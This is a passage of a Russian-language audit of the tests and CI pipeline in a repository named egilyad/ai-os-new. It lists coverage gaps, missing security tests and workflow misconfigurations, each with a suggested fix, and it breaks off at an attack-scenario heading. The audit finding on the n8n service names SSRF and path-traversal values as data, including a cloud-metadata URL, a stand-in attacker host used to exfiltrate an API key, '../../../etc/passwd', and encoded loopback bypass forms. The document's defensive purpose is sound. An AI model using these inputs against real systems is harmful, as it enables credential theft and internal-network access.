# Глубокий аудит тестов и CI — `egilyad/ai-os-new`

**Цель:** `https://github.com/egilyad/ai-os-new`
**Дата аудита:** 2026-10-04
**Объект:** unit-тесты (Vitest, 380 файлов / 44 456 строк), e2e-тесты (Playwright, 6 spec-файлов, 46 тестов), CI-конвейер (`.github/workflows/ci.yml`, 432 строки), Dependabot, vitest.config.ts, playwright.config.ts, test-helpers, coverage-scope.
**Связь с основным отчётом:** см. `CRITICAL_BUGS_AUDIT.md`. Этот файл — продолжение аудита с фокусом на **тесты и CI**.

---

## Краткое резюме

**27 подтверждённых багов в тестах и CI** (6 CRITICAL, 11 HIGH, 8 MEDIUM, 6 LOW).

Тестовая инфраструктура **маскирует критические баги**, выявленные в основном отчёте:

1. **Coverage scope исключает весь security-critical код** — `vitest.config.ts:25-31` включает только `src/stores/**`, `src/hooks/**`, `src/kernel/events/**`, `src/kernel/workers/**`, `src/kernel/container.ts`. ВСЕ `src/kernel/services/**` (где `key-vault.ts`, `n8n-service.ts`, `tool-runner-service.ts`, `sandbox-service.ts`, `prompt-security-service.ts`, `tool-executor.ts`) и **весь** `src/llm/**` (где `fallback-decorator.ts`, `llm-http-client.ts`, адаптеры) **не покрыты coverage-gate**.

2. **`test:stable` script в CI запускает только 20 путей** из 380 существующих тест-файлов. CI-комментарий честно признаёт: «Full `vitest run` (363 files) OOMs/hangs shared runners and carries 257 pre-existing failures in 67 files». Включает `src/kernel/security.test.ts` (4 тривиальных теста), но **НЕ включает** `src/kernel/utils/network.test.ts` (SSRF-тесты для `isPrivateIP`), `notification-webhook-service.test.ts`, `external-secrets-service.test.ts`, `prompt-security-service.test.ts`, `code-sandbox-service.test.ts` — все они существуют и проходят, но не запускаются в CI.

3. **`FallbackDecorator` test не проверяет, какой API-ключ уходит в fallback** — тест утверждает только `res.content === 'from-anthropic'` и что `fallback.sendMessage` был вызван. Никогда не inspect'ит `mock.calls[0][2]` (apiKey). Production-баг C-2 из основного отчёта (ключ primary уходит в fallback-провайдер) остался бы незамеченным.

4. **`KeyVault` не имеет ни одного теста** — AES-GCM + PBKDF2 код существует в `src/kernel/services/key-management/key-vault.ts:38-165`, но `key-vault.test.ts` отсутствует. Любой будущий PR, подключающий vault, может поставить сломанную крипто без сигнала.

5. **`httpGuard` в `tool-runner-service.ts` не имеет теста на bypass** — `0177.0.0.1` (octal), `2130706433` (decimal), `0x7f000001` (hex), `::1`, `169.254.169.254` (AWS metadata) — всё проходит. Существующий `src/kernel/utils/network.test.ts` покрывает эти случаи для `isPrivateIP`, но `httpGuard` — отдельная слабая реализация, и её тестов нет.

6. **`cors-proxy.mjs` `isPrivateIP` — отдельная, нетестируемая реализация** — `scripts/cors-proxy.mjs:55-95` (production-SSRF-gate для LLM-провайдеров) не покрыт ни одним тестом. `normalizeIP` делает битовые сдвиги (`<<16`, `>>>24`) — баг регрессии пройдёт без сигнала.

7. **`decideApproval` race в `company-store.mjs` — нет теста на crash-mid-side-effects** — мутация `a.status` в памяти, затем 4 side-effect записи (`addAgent`, `enqueueWakeup`, `logActivity`, `saveApprovals`), затем только persist approval. Если `saveApprovals` бросит → дубликат агента на retry.

8. **`sync-server.mjs` WebSocket auth (`Sec-WebSocket-Protocol`) — нет ни одного теста** — три latent-бага: `crypto.timingSafeEqual` кидает `RangeError` при разной длине токена (DoS через short-token), browser не получит subprotocol в response (silent handshake failure), unreachable-branch на line 1099.

9. **CI: deploy job пропускает `checkout` + `setup-node` + `npm ci`** — `npm run sourcemaps:upload` упадёт с `ENOENT: package.json`, как только кто-то добавит `SENTRY_AUTH_TOKEN` в секреты. Сегодня маскировано `if:`-condition на пустых секретах.

10. **CI: `rm -f dist/**/*.map` НЕ работает без `shopt -s globstar`** — `**` без globstar = `*`, матч только 1 уровень. Sourcemaps из nested chunks (`dist/assets/chunks/*.map`) улетят на GitHub Pages → публичная утечка ~392k LOC исходников.

11. **CI: `npm audit --audit-level=critical` прячет 7 HIGH CVEs** — `@tiptap/core` (proto-pollution + ReDoS), `fast-uri` (SSRF), `undici` (DoS ×2), `browserslist` (OOM), `brace-expansion` (DoS), `js-yaml` (DoS), `nanoid` (infinite loop). Все проходят зелёным из-за пониженного gate.

12. **CI: e2e shard `routes-b-keys` математически превышает 40-минутный таймаут** — 11 route-тестов × 180s + 2 data-test × 300s = 2580s = 43 мин (без retry). С `retries: 1` — до 86 мин. Cold-runner будет падать с job-timeout, маскируя реальные регрессии.

13. **CI: `cancel-in-progress: true` может отменить mid-flight Pages deploy** — push на `main` во время deploy → cancel → возможна inconsistent state на GitHub Pages.

14. **CI: `::notice` annotations публикуют unsanitized test output** — public-видимые аннотации без фильтра секретов. Если failing-тест залогирует API-ключ в error message → утечка в public GitHub UI.

15. **CI: `persist-credentials: true` на 8 checkout-степах** — `GITHUB_TOKEN` остаётся в `.git/config`, любой compromised npm-postinstall (esbuild, lucide-react typosquat) может его exfiltrate.

---

# ЧАСТЬ 1. CRITICAL баги в тестах

## T-C-1. Coverage scope исключает ВЕСЬ security-critical код

**Файл:** `vitest.config.ts:25-31`

**Описание:**
```ts
coverage: {
    include: [
        'src/stores/**',
        'src/hooks/**',
        'src/kernel/events/**',
        'src/kernel/workers/**',
        'src/kernel/container.ts',
    ],
    // ...
    thresholds: { statements: 30, branches: 20, functions: 30, lines: 30 },
}
```

**НЕ покрыты coverage-gate:**
- `src/kernel/services/**` → здесь живут `key-vault.ts`, `n8n-service.ts`, `parity/tool-runner-service.ts`, `sandbox-service.ts`, `prompt-security-service.ts`, `tool-executor.ts`, `mcp-service.ts`, `notification-webhook-service.ts`, `external-secrets-service.ts`, `compromise-webhook-service.ts`, `crystal-vault-service.ts`, `config-registry.ts`
- `src/llm/**` → здесь живут `fallback-decorator.ts`, `llm-http-client.ts`, 11 decorators, 12 adapter'ов
- `src/components/**`, `src/i18n/**`

Комментарий в `vitest.config.ts:20-24` честно признаёт: *«P1.8: coverage.include is scoped to directories with stable, passing tests. … Extend this list as P1.3–P1.7 add tests to kernel/services, memory, key-management, llm, and workers»*.

**Impact:**
- PR, удаляющий все assertions в `src/kernel/services/key-management/key-vault.ts` → проходит CI зелёным.
- 30%/20% thresholds применяются к ~10% кодовой базы. Остальные 90% — zero coverage gate.
- 20% branch coverage означает: 4 из 5 `if`-веток могут быть нетестированы. Для security guard типа `httpGuard` (8 веток) или `isPrivateIP` (10+ веток) → один тест-case проходит threshold.

**Фикс:**
Расширить `include` на `src/kernel/services/**` + `src/llm/**` с per-directory thresholds (80% для security-файлов, 50% для legacy). Альтернатива: отдельный `vitest.config.security.ts` с `include: ['src/kernel/services/key-management/**', 'src/kernel/services/parity/**', 'src/llm/http/**', 'src/llm/decorators/**']` и 80% thresholds.

---

## T-C-2. `test:stable` script исключает ~200 тест-файлов, включая ВСЕ security-service тесты

**Файл:** `package.json:26` (script `test:stable`)

**Описание:**
`test:stable` запускает ровно 20 путей:
```
src/stores src/hooks src/kernel/events src/kernel/workers
src/kernel/container.test.ts src/kernel/security.test.ts
src/llm/http/llm-http-client.test.ts
src/llm/decorators/{circuit-breaker,retry-decorator,rate-limit-decorator,
                    fallback-decorator,priority-queue,semantic-router,
                    canary-router,compress-route,logging-decorator,
                    cost-manager}.test.ts
src/llm/registry/adapter-factory.test.ts
src/kernel/services/rivals/guardrail-service.test.ts
```

CI-комментарий (`.github/workflows/ci.yml:141-143`): *«Full `vitest run` (363 files) OOMs/hangs shared runners and carries 257 pre-existing failures in 67 files»*.

**Security-critical тест-файлы, которые СУЩЕСТВУЮТ и ПРОХОДЯТ, но НЕ в `test:stable`:**
| Файл | Что тестирует |
|---|---|
| `src/kernel/utils/network.test.ts` | `isPrivateIP` SSRF-guard (10 тестов) |
| `src/kernel/services/notification-webhook-service.test.ts` | webhook SSRF protection |
| `src/kernel/services/external-secrets-service.test.ts` | external secret management |
| `src/kernel/services/prompt-security-service.test.ts` | prompt-injection guard |
| `src/kernel/services/sandbox/code-sandbox-service.test.ts` | sandbox execution |
| `src/kernel/services/browser/browser-harness-service.test.ts` | browser automation |
| `src/kernel/services/compromise-webhook-service.test.ts` | key-compromise webhook |
| `src/kernel/services/crystal-vault/crystal-vault-service.test.ts` | vault |
| `src/kernel/services/approval-service.test.ts` | approval flow |
| `src/kernel/services/agent-identity.test.ts` | identity |

**Impact:**
- CI молча skip'ает каждый security-service test.
- 257 pre-existing failures в 67 файлах включают эти тесты — их никогда не чинят, никогда не видят зелёными.
- Регрессия в `isPrivateIP` (SSRF-guard!) уйдёт в production незамеченной.

**Фикс:**
Добавить security-critical test paths в `test:stable` инкрементально (один service per PR), начиная с `network.test.ts`, `notification-webhook-service.test.ts`, `external-secrets-service.test.ts`, `prompt-security-service.test.ts`.

---

## T-C-3. `FallbackDecorator` test не проверяет, какой API-ключ уходит в fallback

**Файлы:**
- `src/llm/decorators/fallback-decorator.ts:70` (передача `apiKey` в fallback)
- `src/llm/decorators/fallback-decorator.test.ts:60-71` (тест)

**Описание:**
Реализация (line 70):
```ts
return await this.#fallback.sendMessage(messages, model, apiKey, signal, options);
```

Тест (lines 60-71):
```ts
it('falls back when primary throws', async () => {
    // ...
    const res = await dec.sendMessage(MESSAGES, 'm', 'sk-anthropic');
    expect(res.content).toBe('from-anthropic');
    expect(fallback.sendMessage).toHaveBeenCalledTimes(1);
});
```

Тест никогда не делает `expect(fallback.sendMessage.mock.calls[0][2]).toBe(...)`. Если user имеет разные ключи для OpenAI и Anthropic, fallback получает primary-ключ → 401/403 на каждом failover. Тест проходит, production ломается.

**Impact:**
- Production-баг C-2 (cross-provider key leak) остаётся незамеченным.
- Fallback фактически никогда не работает в production (401 от fallback-провайдера), хотя тест зелёный.

**Фикс:**
```ts
expect(fallback.sendMessage.mock.calls[0][2]).toBe('sk-anthropic');
```
После теста с per-adapter ключами. Плюс рефакторинг декоратора на `keyResolver(provider) => apiKey` callback.

---

## T-C-4. `KeyVault` имеет ZERO тестов

**Файл:** `src/kernel/services/key-management/key-vault.ts:38-165` — **нет** `key-vault.test.ts` (glob verified)

**Описание:**
AES-GCM + PBKDF2 vault-code (`unlock`/`lock`/`encryptKey`/`decryptKey`/`encryptAllKeys`/`decryptAllKeys`/`stripPlaintextKeys`) существует, но не имеет ни одного теста. Комментарий на line 33: *«Vault is intentionally NOT wired into the app's bootstrap»* — но код shipped и может быть молча re-wired.

Особенно опасные места без тестов:
- `decryptKey` (line 113) — возвращает `ciphertext` как есть при locked vault → silent plaintext leak как будто ciphertext
- `'[VAULT LOCKED]'` sentinel handling (lines 84, 133)
- `encryptAllKeys` short-circuit (line 141)
- `stripPlaintextKeys` (line 152)

**Impact:**
Будущий PR, подключающий vault, может поставить сломанную крипто:
- `decryptKey` возвращает plaintext вместо ciphertext при locked state → silent key leak.
- `'[VAULT LOCKED]'` sentinel попадает в API-call как реальный ключ → 401 от провайдера, ключ в logs.
- `encryptAllKeys` молча skip'ает encrypt при locked → ключи остаются plaintext в IndexedDB.

**Фикс:**
Создать `src/kernel/services/key-management/key-vault.test.ts` покрывающим:
- encrypt/decrypt round-trip
- wrong-password rejection
- lock-clears-masterKey
- `'[VAULT LOCKED]'` sentinel handling
- `decryptKey` на locked vault → не возвращает plaintext

---

## T-C-5. `N8NService.trigger` — нет SSRF/URL-injection теста

**Файл:** `src/kernel/services/n8n-service.ts:19, 22, 41-45` — **нет** `n8n-service.test.ts`

**Описание:**
```ts
// n8n-service.ts:19
const endpoint = `${cfg.url.replace(/\/$/, '')}/api/v1/workflows/${workflowId}/execute`;
const res = await fetch(endpoint, { headers: { 'X-N8N-API-KEY': cfg.apiKey }, body: ... });
```

`cfg.url` читается напрямую из `agentMemory` JSON (line 41-45) с zero validation. `workflowId` тоже не валидируется — path-traversal через `../` работает.

**Attack scenarios, не покрытые тестами:**
- `n8nApiUrl: 'http://169.254.169.254/latest/meta-data'` → AWS metadata theft
- `n8nApiUrl: 'http://attacker.example/'` → exfiltrate `X-N8N-API-KEY` + payload
- `workflowId: '../../../etc/passwd'` → path traversal

**Impact:**
- Production-баг C-3 (stored prompt-injection → SSRF + key exfil) остаётся незамеченным.
- Любая future-регрессия в `n8n-service` (например, добавление "flexible URL parsing") уйдёт без сигнала.

**Фикс:**
Создать `src/kernel/services/n8n-service.test.ts` покрывающим:
- URL allowlist / scheme check
- host-blocking через `isPrivateIP`
- `workflowId` regex validation (`/^[a-zA-Z0-9_-]+$/`)
- rejection of `agentMemory` rows without `kind: 'n8n'` field

---

## T-C-6. `httpGuard` в `tool-runner-service` — нет bypass-теста

**Файлы:**
- `src/kernel/services/parity/tool-runner-service.ts:84-106` (определение `httpGuard`)
- **нет** `tool-runner-service.test.ts`

**Описание:**
`httpGuard` блокирует только `localhost`, `.local`, decimal-octet IPv4 regexes (`/^127\./`, `/^10\./`, `/^192\.168\./`, `/^172\.(1[6-9]|2\d|3[01])\./`), `0.0.0.0`. Не блокирует:
- IPv6: `::1`, `[::1]`, `fe80::`, `fc00::/7`
- IPv4-mapped IPv6: `::ffff:127.0.0.1`
- Decimal int: `2130706433`
- Hex: `0x7f000001`
- Octal: `0177.0.0.1`
- AWS metadata: `169.254.169.254`

`src/kernel/utils/network.ts` `isPrivateIP` (хорошо протестированный в `network.test.ts:51-55`) handles все эти случаи — но здесь не используется.

**Impact:**
- LLM-агент через `http.fetch` builtin может достучаться до metadata-endpoint и localhost-сервисов через дюжину известных bypass'ов.
- Production-баг C-4 остаётся без regression-test.

**Фикс:**
1. Заменить body `httpGuard` на `import { isPrivateIP } from '../../utils/network'`.
2. Создать `tool-runner-service.test.ts` с перечислением каждого bypass-формы.

---

# ЧАСТЬ 2. HIGH баги в тестах

## T-H-1. `decideApproval` side-effect atomicity — нет теста

**Файлы:** `server/company-store.mjs:707-777` — **нет** `company-store.test.mjs`

**Описание:**
`decideApproval` мутирует `a.status = 'approved'` (line 719) в памяти, затем:
1. `enqueueWakeup(...)` (line 734) → пишет `wakeups.json`
2. `addAgent(...)` (line 741) → пишет `companies.json`
3. `setAgentStatus(...)` (line 753) → пишет `companies.json` (снова)
4. `logActivity(...)` (lines 749, 765, 772) → пишет `activity.json`
5. **Только потом** (line 774) → `saveApprovals(all)` → пишет `approvals.json`

Если `addAgent` бросает (например, "manager not found" line 119-120), approval остаётся в памяти со `status: 'approved'`, но `saveApprovals` не вызывается → на диске остаётся `pending`. Restart → можно повторно approve → дубликат side-effects.

Если `addAgent` succeeds, но `saveApprovals` падает (disk full, EACCES) → агент создан, но approval остался `pending` → restart → повторный approve → duplicate agent.

**Impact:**
- Production-баг C-5 (race в `decideApproval`).
- Дубликаты агентов, двойная трата wakeup'ов, corrupted ledger — без regression-test.

**Фикс:**
Создать `server/company-store.test.mjs` покрывающим:
- `decideApproval` с bad `managerId` → verify no agent created, approval stays `pending`
- `decideApproval` mid-failure (mock `saveApprovals` to throw) → verify no side-effects persisted
- Idempotency: double-decide on same approval → second call returns `SETTLED` 409

---

## T-H-2. `sync-server.mjs` `writeQueue` failure-recovery — нет теста

**Файл:** `server/sync-server.mjs:176, 277-295` — **нет** `sync-server.test.mjs`

**Описание:**
`writeQueue = writeQueue.then(() => { try { ... } catch { writeJson(res, 500) } })`. Handler имеет internal try/catch, поэтому индивидуальные failures не reject'ят chain — это хорошо. **НО:**
- Нет timeout на queue
- Нет max-length cap
- Нет теста, что queue выживает `fs.writeFileSync` failure (disk full, EACCES)
- Если `fs.renameSync` (line 281) бросает **после** `fs.writeFileSync` (line 280) success → `.tmp` file orphaned, следующий write идёт против оригинального `DB_FILE`
- Нет теста на concurrent PUTs serialization

**Impact:**
- Production-баг C-6 (writeQueue без `.catch`).
- Silent data corruption на partial write failures.
- Orphaned `.tmp` files накапливаются на диске.

**Фикс:**
Создать `server/sync-server.test.mjs` покрывающим:
- Stub `fs.writeFileSync` to throw → verify queue продолжает обслуживать следующий PUT, verify response is 500
- Concurrent PUTs → verify single final file (last-write-wins)
- `.tmp` orphan cleanup

---

## T-H-3. `useKeyStore.enableAllKeys` test не проверяет preservation of stats

**Файлы:**
- `src/stores/useKeyStore.ts:111-118` (implementation)
- `src/stores/useKeyStore.test.ts:190-209` (test)

**Описание:**
Implementation: `stats: { ...k.stats, errorCount: 0, lastError: undefined }` — preserving other stats (`successCount`, `totalTokens`, `avgLatency`).

Test (line 208): `expect(keyService.updateKey).toHaveBeenCalledTimes(2);` — только count. Никогда не inspect'ит `keyService.updateKey.mock.calls[0][1].stats` для проверки `successCount`, `totalTokens`.

Если future-рефакторинг изменит на `stats: { errorCount: 0 }` (wiping все остальные stats) → тест всё равно проходит.

**Impact:**
- Production-баг H-7 (stale stats overwrite) остаётся без regression-test.
- Silent stat-loss regression — `enableAllKeys` может wipe'нуть usage/cost analytics.

**Фикс:**
```ts
expect(keyService.updateKey.mock.calls[0][1].stats).toMatchObject({
    successCount: 5,
    totalTokens: 1000,
    errorCount: 0,
});
```
После seeding `k.stats` с non-zero values.

---

## T-H-4. `LLMHttpClient.streamPost` — нет теста вообще

**Файлы:**
- `src/llm/http/llm-http-client.ts:393-481` (implementation)
- `src/llm/http/llm-http-client.test.ts:1-83` (test file) — только `post` тестируется, `streamPost` НЕТ

**Описание:**
`streamPost` регистрирует request в `_inflight` Map (line 403), затем в `finally` (lines 469-480) вызывает `done()` (line 473) → удаляет entry из `_inflight` **на headers-received time**, не на stream-completion. Comment на lines 474-478 это признаёт.

`cancelAll()`/`cancelLongestRunning()` (lines 66-104) не могут abort'ить active streams — их нет в `_inflight` во время body-consumption.

**Impact:**
- Production-баг H-5 (streamPost невидим для memory-pressure cancellation).
- Long-running stream, который user abort'ит через `cancelAll()`, продолжает потреблять bandwidth и LLM token budget до тех пор, пока provider не закроет connection.
- Memory-pressure watchdog не может остановить heap-growth от активных стримов.

**Фикс:**
Добавить `streamPost` тесты:
- `_inflight` populated during active streaming (не только на headers)
- `cancelAll()` abort'ит active stream's `Response.body`
- `done()` callback вызывается, когда consumer заканчивает читать body

---

## T-H-5. `cors-proxy.mjs` `isPrivateIP` / `normalizeIP` — нет теста

**Файл:** `scripts/cors-proxy.mjs:55-95` — **нет** `scripts/cors-proxy.test.mjs`

**Описание:**
Это **отдельная реализация** от `src/kernel/utils/network.ts` (который тестируется). `normalizeIP` (lines 27-53) делает битовые сдвиги:
```js
const low32 = ((nums[nums.length - 2] ?? 0) << 16) | (nums[nums.length - 1] ?? 0);
return [(low32 >>> 24) & 255, (low32 >>> 16) & 255, (low32 >>> 8) & 255, low32 & 255].join('.');
```
Комментарий (lines 24-26) явно упоминает bypass-формы — но тестов нет.

**Bypass-формы, не покрытые тестами:**
- `::ffff:127.0.0.1` (IPv4-mapped IPv6)
- `::ffff:7f00:1` (IPv4-mapped IPv6 hex form)
- `2130706433` (decimal int)
- `0x7f000001` (hex)
- `0177.0.0.1` (octal)
- `fc00::1` (ULA)
- `fe80::1` (link-local)
- `[::1]` (IPv6 loopback)

**Impact:**
- CORS-proxy — production SSRF-gate для LLM-provider egress.
- Регрессия в `normalizeIP` reopen'ёт SSRF bypass'ы без сигнала.

**Фикс:**
Создать `scripts/cors-proxy.test.mjs` (или extract `normalizeIP`/`isPrivateIP` в tested module) покрывающим каждый bypass-форм.

---

## T-H-6. WebSocket `Sec-WebSocket-Protocol` auth — нет теста

**Файл:** `server/sync-server.mjs:1084-1102` — **нет** `sync-server.test.mjs`

**Описание:**
```js
const protocols = info.req.headers['sec-websocket-protocol'];
if (protocols) {
    const parts = protocols.split(',').map((p) => p.trim());
    if (parts[0] === 'sync-token' && parts[1]) {
        if (timingSafeEqual(parts[1], SYNC_SECRET)) {  // line 1091
            callback(true);
            return;
        }
        // ...
    }
}
```

**Три latent-бага, не покрытых тестами:**
1. `crypto.timingSafeEqual(parts[1], SYNC_SECRET)` кидает `RangeError` если `parts[1].length !== SYNC_SECRET.length`. Attacker шлёт wrong-length token → WS-server crash → DoS.
2. `callback(true)` вызывается без указания subprotocol → браузеры, ожидающие `Sec-WebSocket-Protocol: sync-token` в response, reject'ят handshake.
3. `parts[0] === 'sync-token' && !parts[1]` branch (line 1099) — unreachable, потому что line 1090 уже гейтит на `parts[1]`.

**Impact:**
- WS-server DoS через short-token attack.
- Browser-clients могут молча fail to connect.
- Нет теста на valid-token success path.

**Фикс:**
Создать `server/sync-server.test.mjs` покрывающим:
- Correct token → `callback(true)` + subprotocol в response
- Wrong-length token → no throw (catch `RangeError`, return 4001)
- `Sec-WebSocket-Protocol: sync-token` (no token) → 4001
- Browser-compatible subprotocol response

---

## T-H-7. E2E не покрывает security-critical flows

**Файлы:** `e2e/data-chat.spec.ts:24-56`, `e2e/data-keys.spec.ts`, `e2e/data-health.spec.ts`, `e2e/basic-flow.spec.ts`, `e2e/routes-{a,b}-flow.spec.ts`

**Описание:**
5 e2e-spec'ов покрывают:
1. Basic route hydration (44 routes assert `body.innerText.length > 300` — weak)
2. Chat send via stubbed OpenRouter
3. Key create/persist via UI
4. Health-check flips pending→active

**НЕ покрыты e2e:**
- Chat → tool-call → sandbox-exec
- Chat → n8n-trigger
- Fallback-decorator path (primary fails → fallback succeeds)
- WebSocket sync (PUT /api/db → WS broadcast)
- Negative paths: failed auth, expired token, oversized payload, CORS rejection
- Sandbox escape attempt через LLM output
- Prompt-injection через user input

**Impact:**
- Full security-critical flow (user prompts agent → agent calls `http.fetch` → `httpGuard` validates → fetch executes) никогда не тестируется end-to-end.
- CSP break, worker-load failure, `cap_request` protocol bug уйдут незамеченными.

**Фикс:**
Добавить:
- `e2e/data-sandbox.spec.ts` — chat → trigger code-sandbox tool → verify result
- `e2e/data-sync.spec.ts` — PUT /api/db с bad token → 401; с valid token → 200 + WS broadcast
- `e2e/data-fallback.spec.ts` — stub primary 500, stub fallback 200, verify fallback reply
- `e2e/data-ssrf.spec.ts` — chat → `http.fetch` с `http://169.254.169.254/` → verify blocked

---

## T-H-8. 7 HIGH-severity CVEs спрятаны пониженным audit-gate

**Файл:** `.github/workflows/ci.yml:224-230`

**Описание:**
`npm audit --audit-level=critical` (line 230) вместо `--audit-level=high`. CI-комментарий (lines 225-229): *«P0.3: --audit-level=high would fail on react-router 7.12-8.2 (GHSA-qwww-vcr4-c8h2, RSC-mode CSRF). This is a client-only SPA, the vuln is not exploitable here»*.

**7 HIGH CVEs, спрятанных пониженным gate (verified через локальный `npm audit --audit-level=high`):**
| Пакет | CVE | Severity |
|---|---|---|
| `@tiptap/core` | GHSA-cp6q-959q-f8rh (proto-pollution XSS) + GHSA-j95f-988m-3j2f (ReDoS) | high |
| `brace-expansion` | stack-exhaustion DoS (7.5) | high |
| `browserslist` | OOM + prototype write (7.5) | high |
| `fast-uri` | **SSRF via malformed IPv6 normalization** (7.5) — иронично для проекта с SSRF-prevention фокусом | high |
| `js-yaml` | DoS (7.5) | high |
| `nanoid` | infinite-loop DoS (5.9) | high |
| `undici` | WebSocket DoS + RetryHandler DoS (5.9 ×2) | high |

**Impact:**
- `@tiptap/core` proto-pollution XSS — эксплуатируем через user-Markdown в чате/форуме.
- `fast-uri` SSRF — иронично обходит SSRF-prevention в самом проекте.
- Любая из них проходит CI зелёным.

**Фикс:**
1. Pin affected deps: `@tiptap/*@^3.30.5`, `fast-uri@>=3.0.2`, `undici@latest`, `browserslist@latest`, `brace-expansion@latest`, `js-yaml@>=4.1.0`, `nanoid@>=3.3.18`.
2. Re-enable `--audit-level=high`.
3. Track react-router CVE отдельно через `// @audit-allow` comment или OSV-scanner с explicit exceptions.

---

# ЧАСТЬ 3. CRITICAL баги в CI

## CI-C-1. Deploy job пропускает `checkout` + `setup-node` + `npm ci`

**Файл:** `.github/workflows/ci.yml:393-415`

**Описание:**
Deploy job:
1. `actions/download-artifact@v4` (line 394) — скачивает `dist/`
2. `if: env.SENTRY_AUTH_TOKEN != '' || env.DATADOG_API_KEY != ''` → `npm run sourcemaps:upload` (line 415)
3. `rm -f dist/**/*.map dist/*.map` (line 422)
4. `actions/upload-pages-artifact@v3` (line 425)
5. `actions/deploy-pages@v4` (line 431)

**Нет:**
- `actions/checkout@v4` — `package.json`, `scripts/upload-sourcemaps.mjs` отсутствуют на runner
- `actions/setup-node@v4` — нет Node.js
- `npm ci` — нет `node_modules`

Сегодня step 2 skip'ается из-за пустых секретов → workflow зелёный. **Как только** maintainer добавит `SENTRY_AUTH_TOKEN` (или `DATADOG_API_KEY`) в repo-secrets → каждый deploy на `main` упадёт с `npm ERR! code ENOENT … package.json`.

**Impact:**
- Error tracking будет "configured", но никогда не получит sourcemaps → stacktraces в production не de-minified.
- Каждое enabled-Sentry-deploy падает → блокирует Pages deploy.

**Фикс:**
Добавить `actions/checkout@v4`, `actions/setup-node@v4` (с `cache: 'npm'`), `npm ci --legacy-peer-deps` перед line 400. **Или** — перенести sourcemap-upload в `build` job (где всё это уже есть), credentials передать через masked step env.

---

## CI-C-2. `rm -f dist/**/*.map` НЕ работает без `shopt -s globstar`

**Файл:** `.github/workflows/ci.yml:422`

**Описание:**
```yaml
run: rm -f dist/**/*.map dist/*.map
```

GitHub Actions default shell: `bash --noprofile --norc -eo pipefail {0}` — **не** включает `globstar`. Без `globstar`:
- `**` коллапсирует в `*` → матч только 1 уровень
- `dist/**/*.map` матчит `dist/assets/foo.map`, **но не** `dist/a/b/c.map`
- Fallback `dist/*.map` ловит только top-level

Vite обычно emits только `dist/assets/*.map` (1 уровень) → сегодня работает. **Но** если Vite когда-нибудь emit'нет nested chunks (`dist/assets/chunks/foo.map` от `manualChunks` split, или `dist/assets/workers/x.map` от worker-chunk) → они улетят на GitHub Pages.

CI-комментарий (lines 417-421): *«the .map files would otherwise ship publicly with the bundle (~392k LOC of sources)»* — т.е. публичная утечка ~392 000 строк исходников.

**Impact:**
- Public source-code leak на GitHub Pages, если Vite emit'нет nested map paths.
- ~392k LOC исходников обнажены — включая все комментарии, TODO, внутреннюю логику.

**Фикс:**
```yaml
run: find dist -type f -name '*.map' -delete
```
POSIX, корректно рекурсит. **Или** `shopt -s globstar && rm -f dist/**/*.map dist/*.map`.

---

## CI-C-3. `cancel-in-progress: true` может отменить mid-flight Pages deploy

**Файл:** `.github/workflows/ci.yml:3-5, 382-383`

**Описание:**
```yaml
concurrency:
    group: ${{ github.workflow }}-${{ github.ref }}
    cancel-in-progress: true
```

Применяется ко **всем** events на ref, включая pushes на `main`/`master`. Deploy job (line 380) — часть той же concurrency group. Второй push на `main` во время deploy → cancel in-progress deploy.

**Сценарий:**
1. Merge PR → push на `main` → начинается deploy.
2. Fast-forward merge ещё одного PR → второй push на `main`.
3. GitHub cancel'ит первый deploy.
4. Если cancel попадает между `actions/upload-pages-artifact@v3` (line 425) и `actions/deploy-pages@v4` (line 431) → artifact uploaded, но не published → wasted run.
5. Если cancel попадает **во время** `deploy-pages` → GitHub Pages может остаться в inconsistent state (action не строго atomic across upload/swap steps).

**Impact:**
- "deploy was cancelled" с предыдущим main-коммитом всё ещё live → новый commit's fixes не уходят в production.
- Inconsistent state на GitHub Pages при cancel mid-deploy.

**Фикс:**
Добавить второй concurrency group на `deploy` job с `cancel-in-progress: false` для `main`/`master`:
```yaml
deploy:
    concurrency:
        group: deploy-${{ github.ref }}
        cancel-in-progress: false
```
**Или** split workflow на CI workflow (`cancel-in-progress: true`) и deploy workflow (`cancel-in-progress: false`).

---

# ЧАСТЬ 4. HIGH баги в CI

## CI-H-1. E2E shard `routes-b-keys` математически превышает 40-минутный таймаут

**Файлы:**
- `.github/workflows/ci.yml:302, 304-313` (matrix + timeout)
- `e2e/playwright.config.ts:13-14` (180s per-test, 1 retry)
- `e2e/routes-b-flow.spec.ts:6-18` (11 routes)
- `e2e/data-keys.spec.ts:10` (`test.describe.configure({ timeout: 300000 })`)
- `e2e/data-chat.spec.ts:18` (то же)
- `e2e/data-health.spec.ts:9` (то же)

**Описание:**
Matrix distribution:
- `basic-routes-a` = basic-flow (4) + routes-a-flow (11) = **15 tests**
- `routes-b-keys` = routes-b-flow (11) + data-keys (2 × 300s override) = **13 tests**
- `health-chat` = data-health (1 × 300s) + data-chat (1 × 300s) = **2 tests**

Default per-test timeout: 180s. Three `data-*` specs override на 300s (5 min each). `retries: 1` удваивает worst-case на failure.

**Для `routes-b-keys`:**
- 11 × 180s + 2 × 300s = 2580s = **43 min** (без retry)
- С retry: до **86 min**

Job `timeout-minutes: 40` (line 302) → exceeded → killed mid-shard с `The job was canceled because it exceeded the maximum execution time` вместо реального test failure.

CI-комментарий (lines 298-301) **предупреждает** об этом: *«the 4 double-boot data tests must not land in one shard, or it exceeds the job timeout»* — но `routes-b-keys` уже содержит 2 из них вместе с 11 route-тестами.

**Impact:**
- Cold-runner run, где любой `routes-b-keys` test retry'ится → hit 40-min job ceiling → killed.
- Flaky signal, маскирующий реальные регрессии.
- e2e gate становится ненадёжным — maintainer'ы могут начать игнорировать e2e-failures.

**Фикс:**
1. Rebalance matrix: два 300s `data-*` specs переложить в `health-chat` (где сегодня только 2 теста).
2. Split `routes-b-keys` на два route-only shards.
3. **Или** поднять `timeout-minutes` до 60 и снизить `retries` до 0 на CI.

---

## CI-H-2. `::notice` annotations публикуют unsanitized test output

**Файлы:**
- `.github/workflows/ci.yml:150-153, 197-200, 367-374, 376-378` (4 `node -e` степа)
- `e2e/dump-console.mjs:11-19, 49-100`

**Описание:**
4 `node -e` step'а и `e2e/dump-console.mjs` публикуют raw test/browser-console output в `::notice title=…::…` annotations. CI-комментарии (lines 151, 198, 368) явно говорят: *«Annotations are visible without login»*.

Escaping (`.replace(/%/g,'%25').replace(/\r/g,'%0D').replace(/\n/g,'%0A')`) побеждает **annotation** injection, но **не** sanitize secret values. Test error messages, stack traces, `pageerror` stacks (`e2e/dump-console.mjs:52-54`, truncated to 600 chars) — всё emit'ится verbatim.

**Сценарий атаки:**
